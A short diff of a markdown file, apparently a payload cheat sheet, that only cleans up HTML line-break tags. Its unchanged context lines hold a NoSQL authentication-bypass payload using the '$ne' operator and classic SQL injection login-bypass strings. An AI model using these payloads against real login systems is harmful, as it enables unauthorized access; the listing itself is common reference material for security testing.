@@ -55,9 +55,8 @@ I share:
 ### NoSQL Injection Payloads
 ```json
 {"username":{"$ne":null},"password":{"$ne":null}}
-<br><br>
+
 ### SQL Injection Payloads
 ' OR '1'='1
-<br>
 admin' --
-<br>
+
